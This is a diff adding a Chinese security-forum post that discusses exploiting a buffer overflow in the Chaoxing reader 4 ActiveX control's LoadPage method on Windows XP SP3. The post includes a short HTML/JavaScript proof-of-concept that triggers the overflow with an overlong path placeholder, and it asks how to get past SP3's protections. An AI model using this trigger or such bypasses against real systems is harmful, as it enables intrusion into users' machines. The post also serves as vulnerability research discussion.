@@ -1,0 +1,41 @@
+
+# [讨论]超星阅读器漏洞在winXP sp3上的利用
+
+- 软件：超星阅读器4
+- 平台：winXP sp3
+
+漏洞函数为`pdg2`组件中的`LoadPage(BSTR URL, long x, long y, single Zoom)`。
+
+其中，第一个参数是我们要加载的pdg文件的路径，该字符串过长超过256字符将导致溢出！！
+
+poc 为：
+
+```
+<SCRIPT language=javascript>
+
+function chaoxing()
+
+{
+
+    huihuiqi.LoadPage("256个以上字节的字符串", 1, 1, 0);
+
+}
+
+</script>
+
+<object classid = "clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2"
+
+name="huihuiqi">
+
+</object>
+
+<script>javascript:chaoxing();</script>
+```
+
+用OD分析之后想在xp sp3下利用。我是写的exp脚本在metasploit中生成恶意文件，可总是利用不成功！在win2k下可以成功。
+
+大家讨论下，是因为sp3加了更多的安全机制所致吗？如何绕过呢……
+
+欢迎交流，目前正在尝试中！！
+
+[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
